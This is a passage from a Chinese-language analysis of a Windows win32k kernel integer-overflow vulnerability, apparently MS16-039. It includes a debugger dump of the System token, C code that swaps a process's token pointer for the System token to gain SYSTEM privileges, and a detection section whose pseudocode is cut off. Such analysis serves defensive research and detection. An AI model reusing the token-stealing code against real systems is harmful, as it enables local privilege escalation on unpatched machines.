       +0x000 Value            : Uint4B
数值的低 `3` 位表示引用计数，去除低 `3` 位数值后的 `32` 位完整数值指向实际表示的内存地址。
`Token`
结构中存储与当前进程相关的安全令牌的数据内容，如用户安全标识符（`Sid`），特权级（`Privileges`）等，代表当前进程作为访问者角色访问其他被访问对象时，访问权限和身份校验的依据。当前的
`System` 进程的 `Token` 结构块的数据如下：
    kd> !token 89a01270
    _TOKEN 0xffffffff89a01270
    TS Session ID: 0
    User: S-1-5-18
    User Groups: 
     00 S-1-5-32-544
        Attributes - Default Enabled Owner 
     01 S-1-1-0
        Attributes - Mandatory Default Enabled 
     02 S-1-5-11
        Attributes - Mandatory Default Enabled 
     03 S-1-16-16384
        Attributes - GroupIntegrity GroupIntegrityEnabled 
    Primary Group: S-1-5-18
    Privs: 
     02 0x000000002 SeCreateTokenPrivilege            Attributes - 
     03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - 
     ...
     33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default 
     34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default 
     35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default 
    Authentication ID:         (0,3e7)
    Impersonation Level:       Anonymous
    TokenType:                 Primary
    Source: *SYSTEM*           TokenFlags: 0x2000 ( Token in use )
    Token ID: 3ea              ParentToken ID: 0
    Modified ID:               (0, 3eb)
    RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
    OriginatingLogonSession: 0
清单 6-5 System 进程的 Token 结构块的数据
在这里由于在提权完成后会将 `Token` 值替换回去，所以暂不关注 `Token` 指针的引用计数的增减。
    BOOL
    xxModifyTokenPointer(DWORD_PTR dstPROC, DWORD_PTR srcPROC)
    {
        if (dstPROC == 0x00 || srcPROC == 0x00)
        {
            return FALSE;
        }
        // get target process original token pointer
        xxPointToGet(dstPROC + off_EPROCESS_Token, &dstToken, sizeof(DWORD_PTR));
        if (dstToken == 0x00)
        {
            return FALSE;
        }
        // get system process token pointer
        xxPointToGet(srcPROC + off_EPROCESS_Token, &srcToken, sizeof(DWORD_PTR));
        if (srcToken == 0x00)
        {
            return FALSE;
        }
        // modify target process token pointer to system
        xxPointToHit(dstPROC + off_EPROCESS_Token, &srcToken, sizeof(DWORD_PTR));
        // just test if the modification is successful
        DWORD_PTR tmpToken = 0x00;
        xxPointToGet(dstPROC + off_EPROCESS_Token, &tmpToken, sizeof(DWORD_PTR));
        if (tmpToken != srcToken)
        {
            return FALSE;
        }
        return TRUE;
    }
清单 6-6 将目标进程 Token 指针替换为源进程 Token 指针的验证代码
提权成功后创建新的命令提示符进程作为后续行为执行进程，将 `Token` 替换回原来的值以保证释放进程 `Token`
时不会发生异常，当前进程的任务就完成了。接下来进行后续的善后操作，随后进程正常退出。
在新启动的命令提示符进程中使用 `whoami` 命令测试进程权属，可以观测到新启动的进程已属于 `System` 用户特权执行：
图 6-2 启动的命令提示符进程已属于 System 用户特权
#### 0x7 检测
根据该漏洞的利用机理，可实现代码对利用该漏洞的样本文件进行检测。该漏洞利用的检测逻辑相对比较简单，编写内核驱动程序并对在漏洞触发关键位置插入陷阱帧，将相关寄存器的值以参数的形式传入陷阱帧处理函数中，并在处理函数中判断寄存器的值是否满足漏洞触发条件。
本分析中使用的环境是 32 位 Windows 7 SP1 基础环境，其 `win32k` 模块的版本为
`6.1.7601.17514`。分配缓冲区内存之前的漏洞关键位置的汇编指令：
    .text:00073FEA    lea     eax, [ecx+1]
    .text:00073FED    imul    eax, 28h
    .text:00073FF0    test    eax, eax
    .text:00073FF2    jz      short loc_7400A
    .text:00073FF4    push    6E677247h       ; Tag
    .text:00073FF9    push    eax             ; NumberOfBytes
    .text:00073FFA    push    21h             ; PoolType
    .text:00073FFC    call    ds:__imp__ExAllocatePoolWithTag@12 ; ExAllocatePoolWithTag(x,x,x)
清单 7-1 漏洞关键位置的汇编指令
检测逻辑以如下的伪代码做简单说明：
      ULONG tmp = ecx;
      tmp++;
      if (tmp 
[1] GDI Data Types
[2] Windows GDI
[3] GDI Objects
[4] MS16-039 - "Windows 10" 64 bits Integer Overflow exploitation by using GDI
objects
[5] Abusing GDI for ring0 exploit primitives
[6] The Big Trick Behind Exploit MS12-034
[7] windows_kernel_address_leaks
[8] Pool Feng-Shui –> Pool Overflow
[9] Kernel Pool Exploitation on Windows 7
[10] SURFOBJ structure
[11] THE BMP FILE FORMAT
[12] Microsoft 安全公告 MS16-039 - 严重
* * *